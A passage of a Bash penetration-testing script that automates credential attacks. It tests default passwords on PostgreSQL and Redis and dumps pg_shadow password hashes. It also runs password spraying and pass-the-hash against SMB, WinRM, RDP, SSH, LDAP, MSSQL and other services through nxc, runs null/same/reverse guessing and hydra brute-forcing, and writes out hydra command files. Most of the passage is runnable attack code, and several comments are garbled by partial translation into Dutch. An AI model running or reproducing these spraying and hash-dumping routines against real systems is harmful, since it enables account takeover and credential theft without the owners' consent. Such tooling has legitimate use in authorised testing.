        echo -e "${GRAY}  >> sudo nxc mysql $_mip -u 'users.txt' -p 'passwords.txt' --no-ssl${NC}"
    fi
    echo ""
fi

# ── PostgreSQL: default credential check ─────────────────────────────────
local _pg_tgt; _pg_tgt=$(get_proto_targets "postgres")
if [[ -n "$_pg_tgt" ]]; then
    local _pg_ip; [[ -f "$_pg_tgt" ]] && _pg_ip=$(head -1 "$_pg_tgt") || _pg_ip="$_pg_tgt"
    local _pg_tmp="$OUTDIR/postgres_default_tmp.txt"
    echo -e "${RED}[!] PostgreSQL (5432) open — testing default credentials...${NC}"
    local _pg_defaults=("postgres:" "postgres:postgres" "postgres:password" "admin:" "pgsql:pgsql")
    local _pg_got_access=false
    for _mc in "${_pg_defaults[@]}"; do
        local _mu="${_mc%%:*}" _mp="${_mc#*:}"
        : > "$_pg_tmp"
        # nxc has limited postgres support; try psql directly which is more reliable
        show_cmd "PGPASSWORD='$_mp' psql -h $_pg_ip -p 5432 -U '$_mu' -c '\\l' 2>/dev/null"
        local _pg_test
        _pg_test=$(PGPASSWORD="$_mp" psql -h "$_pg_ip" -p 5432 -U "$_mu" -c '\l' 2>/dev/null)
        if [[ -n "$_pg_test" ]]; then
            echo -e "${RED}[!] PostgreSQL accessible as ${_mu}:${_mp:-<empty>}${NC}"
            echo "$_pg_test"
            show_cmd "PGPASSWORD='$_mp' psql -h $_pg_ip -p 5432 -U '$_mu' -c 'SELECT usename, passwd FROM pg_shadow;'"
            PGPASSWORD="$_mp" psql -h "$_pg_ip" -p 5432 -U "$_mu"                     -c "SELECT usename, passwd FROM pg_shadow;" 2>/dev/null                     | tee "$OUTDIR/postgres_users.txt"
            echo -e "${WHITE}  >> PGPASSWORD='${_mp}' psql -h $_pg_ip -p 5432 -U '${_mu}'${NC}"
            echo -e "${GRAY}  >> PGPASSWORD='${_mp}' psql -h $_pg_ip -U '${_mu}' -c '\\l'${NC}"
            grep -qF "POSTGRES|$_pg_ip||${_mu}|${_mp}" "$CREDS_FILE" 2>/dev/null ||                     echo "POSTGRES|$_pg_ip||${_mu}|${_mp}|no|password|" >> "$CREDS_FILE"
            _pg_got_access=true; break
        fi
    done
    [[ "$_pg_got_access" == false ]] && echo -e "${GRAY}  → No PostgreSQL default credentials worked${NC}"
    echo ""
fi

# ── Redis: unauthenticated check + AUTH brute ─────────────────────────────
local _rd_tgt; _rd_tgt=$(get_proto_targets "redis")
if [[ -n "$_rd_tgt" ]]; then
    local _rd_ip; [[ -f "$_rd_tgt" ]] && _rd_ip=$(head -1 "$_rd_tgt") || _rd_ip="$_rd_tgt"
    echo -e "${RED}[!] Redis (6379) open — checking for unauthenticated access...${NC}"
    local _rd_tmp="$OUTDIR/redis_check_tmp.txt"
    : > "$_rd_tmp"
    show_cmd "redis-cli -h $_rd_ip -p 6379 info server 2>/dev/null"
    local _rd_test
    _rd_test=$(redis-cli -h "$_rd_ip" -p 6379 info server 2>/dev/null | head -5)
    if [[ -n "$_rd_test" ]]; then
        echo -e "${RED}[!] Redis accessible WITHOUT authentication!${NC}"
        echo "$_rd_test"
        show_cmd "redis-cli -h $_rd_ip -p 6379 keys '*'"
        show_cmd "redis-cli -h $_rd_ip -p 6379 config get requirepass"
        redis-cli -h "$_rd_ip" -p 6379 keys '*' 2>/dev/null | head -20 | tee "$_rd_tmp"
        echo -e "${WHITE}  >> redis-cli -h $_rd_ip -p 6379${NC}"
        echo -e "${GRAY}  >> redis-cli -h $_rd_ip -p 6379 keys '*'${NC}"
        echo -e "${GRAY}  >> redis-cli -h $_rd_ip -p 6379 config get requirepass${NC}"
        grep -qF "REDIS|$_rd_ip" "$CREDS_FILE" 2>/dev/null ||                 echo "REDIS|$_rd_ip|||<unauthenticated>|no|password|" >> "$CREDS_FILE"
    else
        # Try common Redis passwords
        for _rp in "" "redis" "password" "admin" "123456"; do
            local _rd_auth_test
            if [[ -z "$_rp" ]]; then
                _rd_auth_test=$(redis-cli -h "$_rd_ip" -p 6379 ping 2>/dev/null)
            else
                _rd_auth_test=$(redis-cli -h "$_rd_ip" -p 6379 -a "$_rp" ping 2>/dev/null)
            fi
            if [[ "$_rd_auth_test" == "PONG" ]]; then
                echo -e "${RED}[!] Redis accessible with password: '${_rp:-<empty>}'${NC}"
                echo -e "${WHITE}  >> redis-cli -h $_rd_ip -p 6379${_rp:+ -a '$_rp'}${NC}"
                grep -qF "REDIS|$_rd_ip||redis|${_rp}" "$CREDS_FILE" 2>/dev/null ||                         echo "REDIS|$_rd_ip||redis|${_rp}|no|password|" >> "$CREDS_FILE"
                break
            fi
        done
    fi
    echo ""
fi
}

spray() {
    [[ "$HAS_PASSWORDS" == false && "$HAS_HASHES" == false ]] && return
    



# -------------------------
# COMBO SPRAY (-c / -ch): run EXACT user:secret pairs (no cartesian product)
# In combo mode we DO NOT require gebruikers.txt / wachtwoorden.txt / hashes.txt.
# -------------------------
if [[ -n "$COMBO_MODE" && -f "$COMBO_PAIRS_FILE" ]]; then
    local supported_protos=()
    if [[ "$COMBO_MODE" == "pass" ]]; then
        supported_protos=(smb winrm rdp ssh ldap ftp mssql wmi)
        echo -e "${GREEN}[+] Combo mode: user:pass pairs${NC}"
    else
        # Hash-capable modules alleen
        supported_protos=(smb winrm wmi mssql)
        echo -e "${GREEN}[+] Combo mode: user:hash pairs (PTH)${NC}"
    fi

    for proto in "${supported_protos[@]}"; do
        local proto_targets
        proto_targets=$(get_proto_targets "$proto")
        if [[ -z "$proto_targets" ]]; then
            echo -e "${GRAY}[skip] $proto - port ${PROTO_PORTS[$proto]} closed${NC}"
            continue
        fi

        local tcount
        tcount=$(wc -l < "$proto_targets" 2>/dev/null || echo 0)
        echo -e "${CYAN}[*] Spraying $proto (combo) - $tcount targets...${NC}"

        while IFS= read -r line || [[ -n "$line" ]]; do
            [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
            local user="${line%%:*}"
            local secret="${line#*:}"

            # Try common domein/local gebruikersnaam formats without forcing a enkele style.
            build_user_variants "$user"
            for uvar in "${USER_VARIANTS[@]}"; do
                if [[ "$COMBO_MODE" == "pass" ]]; then
                    run_cmd_process "sudo nxc $proto $proto_targets -u '$uvar' -p '$secret' --continue-on-success" "password"
                    # If we have a DOMAIN and user is simple, also try explicit -d DOMAIN (some modules prefer this)
                    if [[ -n "$DOMAIN" && "$user" != *""* && "$user" != *"@"* ]]; then
                        run_cmd_process "sudo nxc $proto $proto_targets -u '$user' -d '$DOMAIN' -p '$secret' --continue-on-success" "password"
                    fi
                else
                    run_cmd_process "sudo nxc $proto $proto_targets -u '$uvar' -H '$secret' --continue-on-success" "hash"
                    if [[ -n "$DOMAIN" && "$user" != *""* && "$user" != *"@"* ]]; then
                        run_cmd_process "sudo nxc $proto $proto_targets -u '$user' -d '$DOMAIN' -H '$secret' --continue-on-success" "hash"
                    fi
                fi

                # Extra: SMB local-auth attempt (useful when creds are local, not domein)
                if [[ "$proto" == "smb" ]]; then
                    if [[ "$COMBO_MODE" == "pass" ]]; then
                        run_cmd_process "sudo nxc smb $proto_targets -u '$user' -p '$secret' --local-auth --continue-on-success" "password"
                    else
                        run_cmd_process "sudo nxc smb $proto_targets -u '$user' -H '$secret' --local-auth --continue-on-success" "hash"
                    fi
                fi
                # Extra: MSSQL SQL auth (--local-auth) - bypasses Windows/Kerberos auth
                # IMPORTANT: accounts that fail Windows auth (domain guest-type) may succeed with SQL auth
                if [[ "$proto" == "mssql" ]]; then
                    if [[ "$COMBO_MODE" == "pass" ]]; then
                        run_cmd_process "sudo nxc mssql $proto_targets -u '$user' -p '$secret' --local-auth --continue-on-success" "password"
                    else
                        run_cmd_process "sudo nxc mssql $proto_targets -u '$user' -H '$secret' --local-auth --continue-on-success" "hash"
                    fi
                fi
            done
        done < "$COMBO_PAIRS_FILE"
        echo ""
    done
    return
fi

    # Determine which user list to use (in priority order)
    # KRITIEK: Check if file EXISTS and is NOT EMPTY before using
    local SPRAY_USERS=""
    
    if [[ -s "$OUTDIR/users_validated.txt" ]]; then
        SPRAY_USERS="$OUTDIR/users_validated.txt"
        echo -e "${GREEN}[+] Using kerbrute-validated usernames${NC}"
    elif [[ -s "$OUTDIR/all_users_clean.txt" ]]; then
        SPRAY_USERS="$OUTDIR/all_users_clean.txt"
        echo -e "${GREEN}[+] Using consolidated enumerated usernames${NC}"
    elif [[ -s "$OUTDIR/users_found.txt" ]]; then
        SPRAY_USERS="$OUTDIR/users_found.txt"
        echo -e "${GREEN}[+] Using RID brute-force discovered usernames${NC}"
    elif [[ -f "$USERS" && -s "$USERS" ]]; then
        # Alleen use original GEBRUIKERS file if it EXISTS and is NOT EMPTY
        SPRAY_USERS="$USERS"
        echo -e "${GREEN}[+] Using provided user list: $USERS${NC}"
    else
        # No user list found — use built-in common defaults (Windows + Linux) with provided password
        local _default_users_file="$OUTDIR/default_usernames.txt"
        cat > "$_default_users_file" << 'DEFAULTUSERS'
administrator
admin
user
guest
test
root
service
support
svc
backup
helpdesk
operator
manager
sysadmin
webadmin
ftpuser
ftpadmin
dbadmin
oracle
postgres
mssql
mysql
sa
sysdba
vagrant
ansible
deploy
git
jenkins
tomcat
apache
www-data
ubuntu
debian
centos
pi
DEFAULTUSERS
        echo -e "${YELLOW}[!] No user list found — using built-in common usernames (${_default_users_file})${NC}"
        echo -e "${GRAY}    Tip: provide -U users.txt or run RID brute/LDAP dump for real usernames${NC}"
        SPRAY_USERS="$_default_users_file"
    fi
    
    local user_count=$(wc -l < "$SPRAY_USERS" 2>/dev/null || echo 0)
    echo -e "${CYAN}[*] User list: $SPRAY_USERS ($user_count users)${NC}"
    echo -e "${GRAY}[*] Preview:${NC}"
    head -5 "$SPRAY_USERS" | while read -r u; do echo -e "    ${CYAN}$u${NC}"; done
    [[ $user_count -gt 5 ]] && echo -e "    ${GRAY}... and $((user_count - 5)) more${NC}"
    echo ""


    if [[ "$HAS_PASSWORDS" == true ]]; then
        for proto in smb winrm rdp ssh ldap ftp mssql wmi mysql; do
            local proto_targets=$(get_proto_targets "$proto")
            if [[ -n "$proto_targets" ]]; then
                local tcount=$(wc -l < "$proto_targets")
                echo -e "${CYAN}[*] Spraying $proto (passwords) - $tcount targets...${NC}"
                local _nxc_extra_flags=""
                [[ "$proto" == "mysql" ]] && _nxc_extra_flags="--no-ssl"
                run_cmd_process "sudo nxc $proto $proto_targets ${_nxc_extra_flags} -u '$SPRAY_USERS' -p '$PASSWORDS' --continue-on-success" "password"
                # If mysql spray returned no output, suggest direct client fallback
                if [[ "$proto" == "mysql" ]] && [[ -n "$proto_targets" ]]; then
                    local _spray_mip; [[ -f "$proto_targets" ]] && _spray_mip=$(head -1 "$proto_targets") || _spray_mip="$proto_targets"
                    if ! grep -qE "^MYSQL\|" "$CREDS_FILE" 2>/dev/null; then
                        echo -e "${GRAY}  [*] If nxc mysql returned no output, try direct client (handles SSL differently):${NC}"
                        # Show copy-paste commands for each password tried
                        while IFS= read -r _sp; do
                            while IFS= read -r _su; do
                                echo -e "${GRAY}  >> MYSQL_PWD='$_sp' mysql -h $_spray_mip -P 3306 -u '$_su'  --ssl-verify-server-cert=OFF -e 'SELECT 1'${NC}"
                            done < "$SPRAY_USERS" 2>/dev/null
                        done < "$PASSWORDS" 2>/dev/null | head -6  # show max 6 combos
                    fi
                fi
                echo ""
            else
                echo -e "${GRAY}[skip] $proto - port ${PROTO_PORTS[$proto]} closed${NC}"
                echo -e "${GRAY}       >> sudo nxc $proto targets.txt -u 'USERS' -p 'PASSWORDS' --continue-on-success${NC}"
            fi
        done
    fi

    if [[ "$HAS_HASHES" == true ]]; then
        for proto in smb winrm wmi mssql; do
            local proto_targets=$(get_proto_targets "$proto")
            if [[ -n "$proto_targets" ]]; then
                local tcount=$(wc -l < "$proto_targets")
                echo -e "${CYAN}[*] Spraying $proto (PTH) - $tcount targets...${NC}"
                local _nxc_hash_flags=""
                [[ "$proto" == "mysql" ]] && _nxc_hash_flags="--no-ssl"
                run_cmd_process "sudo nxc $proto $proto_targets ${_nxc_hash_flags} -u '$SPRAY_USERS' -H '$HASHES' --continue-on-success" "hash"
                echo ""
            else
                echo -e "${GRAY}[skip] $proto - port ${PROTO_PORTS[$proto]} closed${NC}"
                echo -e "${GRAY}       >> sudo nxc $proto targets.txt -u 'USERS' -H 'HASHES' --continue-on-success${NC}"
            fi
        done
    fi

    # -------------------------
    # LOCAL ACCOUNT SPRAY (--local-auth)
    # ── MySQL post-auth enumeration (OSCP safe — passive enum only) ─────────────
    local mysql_targets_post=$(get_proto_targets "mysql")
    if [[ -n "$mysql_targets_post" ]] && [[ -s "$CREDS_FILE" ]]; then
        local _mysql_done=""
        while IFS='|' read -r m_proto m_ip m_dom m_user m_secret m_pwned m_type m_info; do
            [[ "${m_proto^^}" != "MYSQL" ]] && continue
            local _mk="$m_ip|$m_user"
            [[ "$_mysql_done" == *"$_mk"* ]] && continue
            _mysql_done="$_mysql_done $_mk"
            local m_auth; [[ "$m_type" == "hash" ]] && m_auth="-H '$m_secret'" || m_auth="-p '$m_secret'"
            echo -e "\n${RED}[!] MySQL authenticated as $m_user@$m_ip — enumerating databases:${NC}"
            run_cmd "sudo nxc mysql $m_ip -u '$m_user' ${m_auth} --no-ssl --all-databases" "$OUTDIR/mysql_databases.txt"
            if [[ -s "$OUTDIR/mysql_databases.txt" ]]; then
                echo -e "${RED}[!] MySQL databases found — check $OUTDIR/mysql_databases.txt${NC}"
            fi
            run_cmd "sudo nxc mysql $m_ip -u '$m_user' ${m_auth} --no-ssl -q 'SELECT user,host FROM mysql.user;'" "$OUTDIR/mysql_users.txt"
            echo -e "${YELLOW}[*] MySQL manual commands:${NC}"
            echo -e "${WHITE}    >> MYSQL_PWD='$m_secret' mysql -h $m_ip -u '$m_user'  --ssl-verify-server-cert=disabled${NC}"
            echo -e "${GRAY}    >> MYSQL_PWD='$m_secret' mysql -h $m_ip -u '$m_user'  -e 'show databases; select user,host from mysql.user;'${NC}"
        done < "$CREDS_FILE"
    fi

    # MySQL default check runs at start of Phase 6 (see early default cred block above)

    # -------------------------
    local smb_targets=$(get_proto_targets "smb")
    if [[ -n "$smb_targets" ]]; then
        echo -e "${CYAN}[*] Spraying SMB with --local-auth (local accounts, not domain)...${NC}"
        if [[ "$HAS_PASSWORDS" == true ]]; then
            run_cmd_process "sudo nxc smb $smb_targets $NXC_SMB_PORT -u '$SPRAY_USERS' -p '$PASSWORDS' --local-auth --continue-on-success" "password"
        fi
        if [[ "$HAS_HASHES" == true ]]; then
            run_cmd_process "sudo nxc smb $smb_targets $NXC_SMB_PORT -u '$SPRAY_USERS' -H '$HASHES' --local-auth --continue-on-success" "hash"
        fi
        echo ""
    fi

    # -------------------------
    # MSSQL SQL AUTH SPRAY (--local-auth = SQL Server auth, bypasses Windows/Kerberos)
    # CRITICAL: Some accounts authenticate via SQL auth even when Windows auth fails.
    # Example: domain guest accounts, SQL-only logins, accounts where Windows auth is denied.
    # impacket-mssqlclient WITHOUT -windows-auth uses SQL auth (equivalent to --local-auth here).
    # -------------------------
    local mssql_spray_targets=$(get_proto_targets "mssql")
    if [[ -n "$mssql_spray_targets" ]]; then
        echo -e "${CYAN}[*] Spraying MSSQL with --local-auth (SQL auth - NOT Windows auth)...${NC}"
        echo -e "${YELLOW}    Tip: equivalent to 'impacket-mssqlclient user:pass@ip' WITHOUT -windows-auth${NC}"
        if [[ "$HAS_PASSWORDS" == true ]]; then
            run_cmd_process "sudo nxc mssql $mssql_spray_targets $NXC_MSSQL_PORT -u '$SPRAY_USERS' -p '$PASSWORDS' --local-auth --continue-on-success" "password"
        fi
        if [[ "$HAS_HASHES" == true ]]; then
            run_cmd_process "sudo nxc mssql $mssql_spray_targets $NXC_MSSQL_PORT -u '$SPRAY_USERS' -H '$HASHES' --local-auth --continue-on-success" "hash"
        fi
        echo ""
    fi
}

# ============================================================================
# NSR SPRAY (null, same, reverse wachtwoorden)
# ============================================================================
nsr_spray() {
    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 5: nsr SPRAY (null/same/reverse)                   ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    # Priority: Use geldigeated gebruikersnamen (kerbrute confirmed or genereerd) if available
    local SPRAY_USERS=""
    if [[ -s "$OUTDIR/users_validated.txt" ]]; then
        SPRAY_USERS="$OUTDIR/users_validated.txt"
        echo -e "${GREEN}[+] Using validated usernames for spraying${NC}"
    elif [[ -s "$OUTDIR/all_users_clean.txt" ]]; then
        SPRAY_USERS="$OUTDIR/all_users_clean.txt"
        echo -e "${GREEN}[+] Using consolidated enumerated usernames${NC}"
    elif [[ -s "$OUTDIR/users_found.txt" ]]; then
        SPRAY_USERS="$OUTDIR/users_found.txt"
        echo -e "${GREEN}[+] Using RID brute-force discovered usernames${NC}"
    elif [[ -f "$USERS" && -s "$USERS" ]]; then
        SPRAY_USERS="$USERS"
        echo -e "${GREEN}[+] Using provided user list: $USERS${NC}"
    else
        echo -e "${YELLOW}[!] No user list available for -e nsr spray${NC}"
        return
    fi

    local user_count=$(wc -l < "$SPRAY_USERS" 2>/dev/null || echo 0)
    # Add 1 if file doesn't end with newline (laatste line not counted by wc -l)
    [[ -s "$SPRAY_USERS" ]] && [[ $(tail -c1 "$SPRAY_USERS" | wc -l) -eq 0 ]] && ((user_count++))
    
    echo -e "${CYAN}[*] Using $SPRAY_USERS ($user_count users)${NC}"
    echo -e "${GRAY}[*] Usernames:${NC}"
    head -10 "$SPRAY_USERS" | while IFS= read -r u || [[ -n "$u" ]]; do echo -e "    ${CYAN}$u${NC}"; done
    [[ $user_count -gt 10 ]] && echo -e "    ${GRAY}... and $((user_count - 10)) more${NC}"
    echo ""

    local any_tested=false

    # -------------------------
    # NXC protocols (SMB, LDAP, WinRM, RDP)
    # -------------------------
    echo -e "${CYAN}[*] -e n: Testing null/empty password...${NC}"
    local _n_any=false
    for proto in smb ldap; do
        local proto_targets=$(get_proto_targets "$proto")
        if [[ -n "$proto_targets" ]]; then
            show_cmd "sudo nxc $proto $proto_targets -u '$SPRAY_USERS' -p '' --continue-on-success"
            run_cmd_process "sudo nxc $proto $proto_targets -u '$SPRAY_USERS' -p '' --continue-on-success" "null-pass"
            any_tested=true; _n_any=true
        fi
    done
    [[ "$_n_any" == false ]] && echo -e "${GRAY}    [skip] SMB/LDAP not open — null-pass test only runs against SMB/LDAP${NC}"

    echo -e "\n${CYAN}[*] -e s: Testing username=password...${NC}"
    local temp_same="$OUTDIR/temp_same_pass.txt"
    cp "$SPRAY_USERS" "$temp_same"
    local _s_any=false
    for proto in smb winrm ldap rdp; do
        local proto_targets=$(get_proto_targets "$proto")
        if [[ -n "$proto_targets" ]]; then
            echo -e "${GREEN}    $proto (OPEN)...${NC}"
            show_cmd "sudo nxc $proto $proto_targets -u '$SPRAY_USERS' -p '$temp_same' --no-bruteforce --continue-on-success"
            run_cmd_process "sudo nxc $proto $proto_targets -u '$SPRAY_USERS' -p '$temp_same' --no-bruteforce --continue-on-success" "user=pass"
            any_tested=true; _s_any=true
        fi
    done
    [[ "$_s_any" == false ]] && echo -e "${GRAY}    [skip] SMB/WinRM/LDAP/RDP not open — user=pass test only runs against Windows protocols${NC}"

    echo -e "\n${CYAN}[*] -e r: Testing reverse username as password...${NC}"
    local temp_reverse="$OUTDIR/temp_reverse_pass.txt"
    while read -r user; do
        echo "$user" | rev
    done < "$SPRAY_USERS" > "$temp_reverse"
    local _r_any=false
    for proto in smb ldap; do
        local proto_targets=$(get_proto_targets "$proto")
        if [[ -n "$proto_targets" ]]; then
            echo -e "${GREEN}    $proto (OPEN)...${NC}"
            show_cmd "sudo nxc $proto $proto_targets -u '$SPRAY_USERS' -p '$temp_reverse' --no-bruteforce --continue-on-success"
            run_cmd_process "sudo nxc $proto $proto_targets -u '$SPRAY_USERS' -p '$temp_reverse' --no-bruteforce --continue-on-success" "reverse"
            any_tested=true; _r_any=true
        fi
    done
    [[ "$_r_any" == false ]] && echo -e "${GRAY}    [skip] SMB/LDAP not open — reverse test only runs against SMB/LDAP${NC}"

    # -------------------------
    # SSH spray via hydra (if SSH is open - kritiek for Linux!)
    # -------------------------
    if [[ -s "$OUTDIR/targets_ssh.txt" ]]; then
        echo -e "\n${CYAN}[*] SSH spray via hydra (-e nsr)...${NC}"
        local first_ssh_target=$(head -1 "$OUTDIR/targets_ssh.txt")
        echo -e "${GREEN}    SSH is OPEN - running hydra with -e nsr...${NC}"
        show_cmd "hydra -L '$SPRAY_USERS' -e nsr -t $HYDRA_THREADS -f ssh://$first_ssh_target"
        queue_phase_cmd "hydra -L '$SPRAY_USERS' -e nsr -t $HYDRA_THREADS -f ssh://$first_ssh_target"
        hydra -L "$SPRAY_USERS" -e nsr -t "$HYDRA_THREADS" -f "ssh://$first_ssh_target" 2>&1 | tee "$OUTDIR/hydra_ssh_nsr.txt" | while read -r line; do
            if [[ "$line" == *"login:"* ]] || [[ "$line" == *"[22]"* && "$line" == *"host:"* ]]; then
                echo -e "${GREEN}[+] $line${NC}"
                echo "[ssh-valid] $line" >> "$CREDS_FILE"
            else
                echo "$line"
            fi
        done
        any_tested=true
    fi
    
    # -------------------------
    # FTP spray via hydra (if FTP is open)
    # -------------------------
    if [[ -s "$OUTDIR/targets_ftp.txt" ]]; then
        echo -e "\n${CYAN}[*] FTP spray via hydra (-e nsr)...${NC}"
        local first_ftp_target=$(head -1 "$OUTDIR/targets_ftp.txt")
        echo -e "${GREEN}    FTP is OPEN - running hydra with -e nsr...${NC}"
        show_cmd "hydra -L '$SPRAY_USERS' -e nsr -t $HYDRA_THREADS -f ftp://$first_ftp_target"
        queue_phase_cmd "hydra -L '$SPRAY_USERS' -e nsr -t $HYDRA_THREADS -f ftp://$first_ftp_target"
        hydra -L "$SPRAY_USERS" -e nsr -t "$HYDRA_THREADS" -f "ftp://$first_ftp_target" 2>&1 | tee "$OUTDIR/hydra_ftp_nsr.txt" | while read -r line; do
            if [[ "$line" == *"login:"* ]] || [[ "$line" == *"[21]"* && "$line" == *"host:"* ]]; then
                echo -e "${GREEN}[+] $line${NC}"
                echo "[ftp-valid] $line" >> "$CREDS_FILE"
            else
                echo "$line"
            fi
        done
        any_tested=true
    fi

    # -------------------------
    # SMTP/POP3/IMAP spray suggestions (show commandoo's, don't auto-run)
    # -------------------------
    local mail_suggestions=false
    
    if [[ -s "$OUTDIR/targets_smtp.txt" ]]; then
        local first_smtp_target=$(head -1 "$OUTDIR/targets_smtp.txt")
        echo -e "\n${CYAN}[*] SMTP spray suggestion (port 25 OPEN):${NC}"
        echo -e "${GREEN}>> hydra -L '$SPRAY_USERS' -e nsr -t 4 smtp://$first_smtp_target${NC}"
        mail_suggestions=true
        any_tested=true
    fi
    
    if [[ -s "$OUTDIR/targets_pop3.txt" ]]; then
        local first_pop3_target=$(head -1 "$OUTDIR/targets_pop3.txt")
        echo -e "\n${CYAN}[*] POP3 spray suggestion (port 110 OPEN):${NC}"
        echo -e "${GREEN}>> hydra -L '$SPRAY_USERS' -e nsr -t 4 pop3://$first_pop3_target${NC}"
        mail_suggestions=true
        any_tested=true
    fi
    
    if [[ -s "$OUTDIR/targets_imap.txt" ]]; then
        local first_imap_target=$(head -1 "$OUTDIR/targets_imap.txt")
        echo -e "\n${CYAN}[*] IMAP spray suggestion (port 143 OPEN):${NC}"
        echo -e "${GREEN}>> hydra -L '$SPRAY_USERS' -e nsr -t 4 imap://$first_imap_target${NC}"
        mail_suggestions=true
        any_tested=true
    fi
    
    if [[ "$mail_suggestions" == true ]] && [[ -s "$OUTDIR/smtp_valid_users.txt" ]]; then
        echo -e "\n${GREEN}[+] TIP: Use SMTP-validated users for targeted spray:${NC}"
        echo -e "${GREEN}>> hydra -L '$OUTDIR/smtp_valid_users.txt' -e nsr -t 4 pop3://$(head -1 "$OUTDIR/targets_pop3.txt" 2>/dev/null || echo TARGET)${NC}"
        echo -e "${GREEN}>> hydra -L '$OUTDIR/smtp_valid_users.txt' -e nsr -t 4 imap://$(head -1 "$OUTDIR/targets_imap.txt" 2>/dev/null || echo TARGET)${NC}"
    fi

    # Opschonen
    rm -f "$temp_same" "$temp_reverse" 2>/dev/null
    
    # Ik toon een samenvatting. if nothing was open
    if [[ "$any_tested" == false ]]; then
        echo -e "\n${YELLOW}[!] No supported protocols open for nsr spray${NC}"
        echo -e "${YELLOW}    Checked: SMB(445), WinRM(5985), LDAP(389), RDP(3389), SSH(22), FTP(21), SMTP(25), POP3(110), IMAP(143)${NC}"
    fi
}

# ============================================================================
# GENERATE HYDRA COMMANDS (for manual execution)
generate_hydra_commands() {
    # Hydra is password-based (or -e nsr guessing). If the operator supplied ONLY hashes
    # (e.g., via -ch / -H without -P), generating Hydra commandoo's is misleading.
    if [[ "$HAS_PASSWORDS" != true ]] && [[ "$COMBO_MODE" != "pass" ]]; then
        if [[ "$HAS_HASHES" == true ]]; then
            echo -e "\n${YELLOW}[!] Skipping Hydra command generation (hash-only mode)${NC}"
            echo -e "${GRAY}    (Hydra cannot use NTLM hashes; provide -P or use -c for user:pass pairs)${NC}"
        else
            echo -e "\n${GRAY}[○] Skipping Hydra command generation (no passwords provided)${NC}"
            echo -e "${GRAY}    Use -P passwords.txt or -c user:pass to generate Hydra commands${NC}"
        fi
        return
    fi

    echo -e "\n${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  GENERATING HYDRA COMMANDS                                ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    # Prefer geldigeated gebruikers for hydra too
    local HYDRA_USERS=""
    if [[ -s "$OUTDIR/users_validated.txt" ]]; then
        HYDRA_USERS="$OUTDIR/users_validated.txt"
    elif [[ -s "$OUTDIR/all_users_clean.txt" ]]; then
        HYDRA_USERS="$OUTDIR/all_users_clean.txt"
    elif [[ -f "$USERS" ]]; then
        HYDRA_USERS="$USERS"
    elif [[ -s "$OUTDIR/users_found.txt" ]]; then
        HYDRA_USERS="$OUTDIR/users_found.txt"
    else
        echo -e "${YELLOW}[!] No user list for Hydra commands${NC}"
        return
    fi

    local HYDRA_PASS=""
    [[ -f "$PASSWORDS" ]] && HYDRA_PASS="$PASSWORDS"

    local targets=()
    if [[ -f "$TARGET_ARG" ]]; then
        mapfile -t targets < "$TARGET_ARG"
    else
        targets+=("$TARGET_ARG")
    fi

    cat >> "$HYDRA_CMDS" << EOF

# ============================================================================
# Genereerd: $(date)
# User list: $HYDRA_USERS ($(wc -l < "$HYDRA_USERS") gebruikers)
# Password list: ${HYDRA_PASS:-"(using -e nsr alleen)"}
# ============================================================================

USERS="$HYDRA_USERS"
PASSWORDS="${HYDRA_PASS:-}"

EOF

    for ip in "${targets[@]}"; do
        [[ -z "$ip" ]] && continue
        
        cat >> "$HYDRA_CMDS" << EOF

# ============================================================================
# TARGET: $ip
# ============================================================================
echo -e "\${YELLOW}[*] Target: $ip\${NC}"

# -e nsr ONLY (n=null, s=same as user, r=reverse)
hydra -L "\$USERS" -e nsr -t 4 -f smtp://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f pop3://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f imap://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f ftp://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f ssh://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f telnet://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f mysql://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f postgres://$ip 2>/dev/null
hydra -L "\$USERS" -e nsr -t 4 -f rdp://$ip 2>/dev/null
hydra -P "\$USERS" -e nsr -t 4 -f vnc://$ip 2>/dev/null
hydra -P "\$USERS" -t 4 -f snmp://$ip 2>/dev/null

EOF

        if [[ -n "$HYDRA_PASS" ]]; then
            cat >> "$HYDRA_CMDS" << EOF

# WITH PASSWORD FILE + -e nsr
hydra -L "\$USERS" -P "\$PASSWORDS" -e nsr -t 4 -f smtp://$ip 2>/dev/null
hydra -L "\$USERS" -P "\$PASSWORDS" -e nsr -t 4 -f pop3://$ip 2>/dev/null
hydra -L "\$USERS" -P "\$PASSWORDS" -e nsr -t 4 -f imap://$ip 2>/dev/null
hydra -L "\$USERS" -P "\$PASSWORDS" -e nsr -t 4 -f http-get://$ip/ 2>/dev/null

EOF
        fi
    done

    echo -e "${GREEN}[+] Hydra commands saved to: $HYDRA_CMDS${NC}"
    echo ""
    
    # Show snelle commandoo's alleen for OPEN ports
    echo -e "${CYAN}Quick -e nsr commands (OPEN PORTS ONLY):${NC}"
    
    local first_target="${targets[0]}"
    local shown_any=false
    
    # Check SSH eerst (most important for Linux!)
    if [[ -s "$OUTDIR/targets_ssh.txt" ]]; then
        queue_phase_cmd "hydra -L '$HYDRA_USERS' -e nsr -t $HYDRA_THREADS -f ssh://$first_target"
        shown_any=true
    fi
    
    # Check FTP
    if [[ -s "$OUTDIR/targets_ftp.txt" ]]; then
        queue_phase_cmd "hydra -L '$HYDRA_USERS' -e nsr -t $HYDRA_THREADS -f ftp://$first_target"
        shown_any=true
    fi
    
    # Check RDP
    if [[ -s "$OUTDIR/targets_rdp.txt" ]]; then
    queue_phase_cmd "hydra -L $HYDRA_USERS -e nsr -t 4 rdp://$first_target"
        shown_any=true
    fi
    
    # Check SMTP (port 25)
    if [[ -s "$OUTDIR/targets_smtp.txt" ]]; then
        echo -e "${GREEN}>> hydra -L $HYDRA_USERS -e nsr -t 4 smtp://$first_target${NC}"
        shown_any=true
    fi
    
    # Check POP3 (port 110)
    if [[ -s "$OUTDIR/targets_pop3.txt" ]]; then
